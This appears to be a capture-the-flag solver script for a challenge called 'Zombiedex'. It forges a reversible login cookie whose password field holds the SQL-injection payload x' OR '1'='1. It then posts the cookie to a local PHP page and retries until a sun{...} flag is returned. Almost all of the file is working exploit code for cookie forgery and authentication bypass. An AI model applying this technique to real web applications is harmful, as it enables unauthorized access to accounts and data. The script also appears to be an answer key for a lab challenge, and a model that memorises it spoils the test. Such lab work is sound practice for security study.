#!/usr/bin/env python3
# Zombiedex: the login cookie is reversible (hex(base64(strrev(json)))) and the
# decrypted username/password are used unescaped in the SQL query. Forge a cookie
# whose password is a SQL-injection payload so the WHERE clause always matches.
import sys, os, json, base64, binascii, time, re, requests
BASE=os.environ.get("URL", sys.argv[1] if len(sys.argv)>1 else "http://127.0.0.1:17303")
def encrypt(u,p):
    j=json.dumps({"username":u,"password":p})
    return binascii.hexlify(base64.b64encode(j[::-1].encode())).decode()
cookie=encrypt("admin","x' OR '1'='1")
# The MySQL side-container initializes its data dir on first boot, which finishes
# after the PHP front-end (and thus the check's HTTP readiness probe) is already
# up. Retry until the DB answers and the flag comes back.
text=""
for _ in range(60):
    try:
        r=requests.post(BASE+"/main_page.php", cookies={"ID":cookie}, data={"get_flag":"x"}, timeout=5)
        text=r.text
        m=re.search(r'sun\{[^}]*\}', text)
        if m:
            print(m.group(0)); sys.exit(0)
    except requests.RequestException as e:
        text=str(e)
    time.sleep(2)
print("NO FLAG\n"+text[:500])
